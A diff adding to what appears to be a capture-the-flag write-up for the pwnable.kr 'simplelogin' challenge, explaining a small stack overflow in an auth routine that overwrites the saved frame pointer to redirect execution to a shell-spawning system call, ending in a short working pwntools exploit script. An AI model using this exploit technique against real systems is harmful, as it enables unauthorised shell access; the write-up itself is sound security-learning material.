@@ -78,4 +78,61 @@ after going through auth and correct, theyre quite simple but i can tell theres 
 }
 ```
 
-as we know correct will only run if md5(input) == something. and when correct is called it checks that input == some number if so then it gives us a shell. what im thinking is probably that md5 on the number that is checked in correct is f87cd601aa7fedca99018a8be88eda34. so basically we have to change input in between the auth and correct calls. -0x21524111 = 0xDEADBEEF.
+as we know correct will only run if md5(input) == something. and when correct is called it checks that input == some number if so then it gives us a shell. what im thinking is probably that md5 on the number that is checked in correct is f87cd601aa7fedca99018a8be88eda34. so basically we have to change input in between the auth and correct calls. -0x21524111 = 0xDEADBEEF. either that, or we can jump to the line that sets up binsh and then calls system.
+
+![1774945149955](images/readme/1774945149955.png)
+
+as we can see here input is 16 bytes.
+
+![1774945192766](images/readme/1774945192766.png)
+
+as we can see in main were allowed to pass anything under 0xd bytes (which is the length parameter in auth)
+
+![1774945426160](images/readme/1774945426160.png)
+
+and in auth we memcpy that into a 8 byte buffer which will have a buffer overflow so we have 12-8 = 4 byte overflow. enough for a single pointer. lets see where auStack_c is located so we see what we can overwrite on the stack. ill use gdb. my input has to be decoded to be 12 bytes, so ill use the equasion encoded_len = 4 * (decoded_len/3)
+
+4 * (12/3) = 16. so ill enter A*16
+
+breaking at leave on auth its kinda unreadable
+
+![1774946347652](images/readme/1774946347652.png)
+
+i want my decoded inpht to be 12 * A so ill calculated what the encoded input should be. the encoded input would be QUFBQUFBQUFBQUFB
+
+![1774946477118](images/readme/1774946477118.png)
+
+![1774946628167](images/readme/1774946628167.png)
+
+would you look at that, we overwrote ebp with AAAA??!! and theres a leave instruction which will let us control eip
+
+![1774946715851](images/readme/1774946715851.png)
+
+I control ebp, not a classic eip overwrite
+
+ill write to input and jump to it becuase of the deref so lets form the payload and write a little pwntools script to connetc. payload should be b64(4 bytes + system addr + input) due to jump [esp]
+
+ill get the address of input in bss whichll store my decoded input. &input = 0811eb40
+
+![1774948572004](images/readme/1774948572004.png)
+
+nice now ill get the adress i wanna jump to
+
+nice!
+
+![1774948666373](images/readme/1774948666373.png)
+
+final
+
+```
+from pwn import *
+import base64
+
+payload = b"aaaa"+p32(0x08049278)+p32(0x0811eb40)
+s = ssh(host="pwnable.kr", port=2222, user="simplelogin", password="guest")
+r = s.remote("0", 9003) #run nc
+
+r.recvuntil(b"Authenticate : ")
+r.sendline(base64.b64encode(payload))
+r.interactive()
+```
